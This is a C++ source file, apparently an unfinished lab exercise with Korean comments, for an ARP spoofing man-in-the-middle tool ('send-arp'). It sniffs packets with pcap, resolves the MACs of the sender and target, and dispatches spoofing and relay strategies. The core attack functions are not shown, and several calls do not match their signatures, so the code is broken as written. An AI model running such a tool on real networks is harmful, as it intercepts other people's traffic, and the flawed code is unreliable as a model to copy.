#include <thread>
#include <vector>
#include <iostream>
#include <sstream>
#include <pcap.h>
#include "utils.h"
#include "protocoltype.h"
#include "init.h"
#include <map>
// ... 다른 필요한 헤더 포함 ...


void usage() {
    printf("syntax: send-arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}
unsigned char* attackerMac;

// Observer Interface
class Observer {
public:
    virtual void onArpBroadcastDetected(char *sI,char *tI,std::string sM) = 0;
    virtual void onIPv4PacketReceived(packet,std::string tM) = 0;
};
class ArpSpoofingStrategy {
public:
    virtual void execute() = 0;
};

class RelayStrategy : public ArpSpoofingStrategy {
private:
    packet p;
    std::string tM;
public:
    RelayStrategy(packet pkt,std::string tm) : p(pkt), tM(tm) {}
    
    void execute() override {
        relayPacket(p,tM);  // TODO
        // Relay logic
    }
};

class SpoofingStrategy : public ArpSpoofingStrategy {
private:
    char* sI;
    char* tI;
    std::string sM;
public:
    SpoofingStrategy(char* sdr,char* trg,std::string SM) : sI(sdr), tI(trg), sM(SM) {}
    void execute() override {
        sendArpSpoof(sI,tI,sM);// TODO
    }
};

class ArpPacketHandler : public Observer { //
private:
    ArpSpoofingStrategy* strategy;
public:
    void onArpBroadcastDetected(char *sI,char *tI,std::string sM) override {
        setStrategy(new SpoofingStrategy(sI,tI,sM));
        strategy->execute();   // arpbroadcast 받을시
    }

    void onIPv4PacketReceived(packet pkt,std::string tM) override {
        setStrategy(new RelayStrategy(pkt, tM));
        strategy->execute();// IPv4 패킷 수신 시 실행될 로직 (relay이겠죠)
    }

    void setStrategy(ArpSpoofingStrategy* newStrategy) {
        if (strategy) {
            delete strategy;  // 기존 전략 삭제
        }
        strategy = newStrategy;
    }

    ~ArpPacketHandler() {
        if (strategy) {
            delete strategy;  // 메모리 누수 방지
        }
    }
};

class ArpMonitor {
private:
    std::vector<std::pair<std::string, std::string>> ipPairs;
    std::vector<std::thread> threads;
    Observer* observer;

public:
    ArpMonitor(Observer* obs) : observer(obs) {}  // Observer를 생성자에서 초기화

    void addIpPair(const std::string& sender, const std::string& target) {
        ipPairs.push_back({sender, target});
    }

    void startMonitoring(const char* dev) {
        for (const auto& pair : ipPairs) {
            threads.push_back(std::thread(&ArpMonitor::monitorIpPair, this, dev, pair.first, pair.second));
        }

        for (auto& th : threads) {
            th.join();
        }
    }

private:
    void monitorIpPair(const char* dev, const std::string& sender, const std::string& target) {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t *handle;

        // pcap 세션을 엽니다.
        handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
            std::cerr << "Could not open device: " << errbuf << std::endl;
            return;
        }

        struct pcap_pkthdr header;
        const u_char *packet;

        while (true) {
            packet = pcap_next(handle, &header);
            if (packet == nullptr) {
                continue;
            }

            // 패킷을 분석하여 ARP나 IPv4 패킷인지 확인
            int protocolType=checkType(packet);

            if (protocolType==1) { //arp
                observer->onArpBroadcastDetected();
            } else if (protocolType==2) { //ipv4
                observer->onIPv4PacketReceived();
            }
        }
        pcap_close(handle);
    }
};
int main(int argc,char* argv[]) {
    if(argc!=2){
        usage();
        return -1;
    }

    std::cout << "Input pairs of sender's IP and target's IP you want in each line separated by a space. If you want to end, input 'N'\n";
    
    std::vector<std::pair<std::string, std::string>> ipPairs;
    std::string line, sender, target;

    while (true) {
        std::cout << "Enter sender's IP and target's IP: \n";
        std::getline(std::cin, line);
        std::istringstream iss(line);

        iss >> sender >> target;

        if (sender == "N" || sender == "n") {
            break;
        }

        if (!isValidIP(sender) || !isValidIP(target)) {
            std::cout << "Invalid IP format! Please input again.\n";
            continue;
        }

        ipPairs.push_back({sender, target});
    }

    std::cout << "\nInput ended.\n\n";

    for (const auto& pair : ipPairs) {
        std::cout << "Sender: " << pair.first << ", Target: " << pair.second << std::endl;
    }
    const char* dev = argv[1];

    ArpPacketHandler handler;
    ArpMonitor monitor(&handler);
    RelayStrategy relay;
    SpoofingStrategy spoofing;
    attackerMac=getMyMac(dev);  

    for (auto& pair : ipPairs) {
        monitor.addIpPair(pair.first, pair.second);
        std::map<std::string,std::string> ip_to_mac;
        ip_to_mac[pair.first]=getSenderMac(pair.first,dev,attackerMac);
        ip_to_mac[pair.second]=getSenderMac(pair.second,dev,attackerMac);
        printf("ip_to_mac[%s] : %s \n\n",pair.first.c_str(),ip_to_mac[pair.first].c_str());
    }

    // Initial setup
  
    handler.setStrategy(&relay);
    monitor.startMonitoring(dev);
    
    // Simulate ARP broadcast detection
/*     handler.onArpBroadcastDetected();

    // Change strategy on the fly
    handler.setStrategy(&spoofing);
    handler.onArpBroadcastDetected(); */
    return 0;
}
